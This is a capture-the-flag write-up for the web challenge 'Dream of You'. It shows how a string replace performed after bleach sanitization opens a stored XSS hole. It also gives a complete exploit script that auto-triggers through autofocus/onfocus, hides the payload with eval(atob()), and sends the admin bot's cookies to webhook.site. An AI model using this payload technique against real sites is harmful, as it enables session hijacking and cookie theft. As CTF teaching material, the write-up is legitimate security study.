# Dream of You Write-up

**Challenge:** Dream of You  
**Category:** Web  
**Points:** 182  
**Solves:** 26  
**Author:** yu212  

**Description**

I made a Reader-Insert Fiction posting site.

---

# 1. Source Analysis

The challenge can be reduced to the following logic:

```python
import bleach

def sanitize_text(text: str) -> str:
    return bleach.clean(text, tags=[], attributes={}, strip=True)

def linkify_text(text: str) -> str:
    return bleach.linkify(text)

name = """
CANT BE MORE THAN 20 CHARACTERS
""".strip()

print(len(name))

body = """
SOMETHING
""".strip()

name = sanitize_text(name.strip())
content = body.replace("[name]", "[name] ")
sanitized = sanitize_text(content)
linkified = linkify_text(sanitized)
rendered = linkified.replace("[name]", name)

print(rendered)
```

The application sanitizes the input with `bleach.clean()` which removes all tags and attributes.

Then it runs `bleach.linkify()` which converts URLs into `<a>` elements.

Finally, it performs a **replace after sanitization**:

```
rendered = linkified.replace("[name]", name)
```

This creates an XSS opportunity.

---

# 2. First XSS attempt

My first attempt used an injected attribute:

```python
name = """
" onclick="alert(1)
""".strip()

body = """
https://www.youtube.com/watch?v=dQw4w9WgXcQ[name]
""".strip()
```

However, this required clicking the link.

The bot interaction code shows that clicking links may not be reliable:

```javascript
await page.goto(targetUrl, { waitUntil: "networkidle2", timeout: 5000 });
await page.waitForSelector("input[name='name']", { timeout: 3000 });
await page.click("input[name='name']", { clickCount: 3 });
await page.keyboard.type(name, { delay: 10 });
await page.click("button[type='submit']");
await new Promise((resolve) => setTimeout(resolve, 1000));
await browser.close();
```

So we need an **automatic trigger**.

---

# 3. Triggering XSS automatically

The solution is to use `autofocus` with `onfocus`.

```html
<a href="https://x.com/aa" autofocus onfocus="PAYLOAD"></a>
```

When the page loads, the element receives focus automatically and triggers the event.

However, the `name` field has a **20 character limit**:

```
len('"autofocus onfocus="') == 20
```

So the real payload must go into the body.

---

# 4. URL parsing problem

Spaces cannot exist inside URLs, and the code does:

```
body.replace("[name]", "[name] ")
```

Example transformation:

```
"autofocus onfocus=
https://x.com/aa[name]bb
```

Result:

```html
<a href="https://x.com/aa"autofocus onfocus=" rel="nofollow">
https://x.com/aa"autofocus onfocus=
</a> bb
```

To bypass sanitization, I used:

```
[name<img/>]
```

Because `bleach.clean()` removes tags.

Payload example:

```
"   <!-- yes default name is just 1 quote -->
https://x.com/aa[name<img/>]autofocus=''onfocus='alert(1)'
```

Result:

```html
<a href="https://x.com/aa"autofocus=''onfocus='alert(1)'" rel="nofollow">
https://x.com/aa"autofocus=''onfocus='alert(1)'
</a>
```

---

# 5. Quote restriction

Another problem appeared:

Quotes are not allowed in URLs.

To bypass this limitation I used:

- `eval`
- `atob`
- base64 encoded payload

---

# 6. Final exploit

```python
import base64
import requests
import bleach

def sanitize_text(text: str) -> str:
    return bleach.clean(text, tags=[], attributes={}, strip=True)

def linkify_text(text: str) -> str:
    return bleach.linkify(text)

target = "http://localhost:5000"

name = """
"
""".strip()

payload = """
fetch("https://webhook.site/?"+document.cookie)
"""

body = """
https://x.com/aa[name<img/>]autofocus=''onfocus='eval(atob(this.attributes[3].value))'payload='BASE64'
""".strip().replace("BASE64", base64.b64encode(payload.encode()).decode())

name = sanitize_text(name.strip())
content = body.replace("[name]", "[name] ")
sanitized = sanitize_text(content)
linkified = linkify_text(sanitized)
rendered = linkified.replace("[name]", name)

print(rendered)

p = requests.post(target + "/submit", data={
    "title": "test",
    "content": body,
    "default_name": name
}).url

print(p)

pid = int(p.split("/")[-1])
print(f"{pid=}")

print(requests.post(target + "/report", data={
    "id": pid
}).text)
```

---

# 7. Flag

```
tkbctf{https://www.youtube.com/watch?v=Bg0yQtrqR_A}
```

Thanks for reading and happy hacking! 🚩 
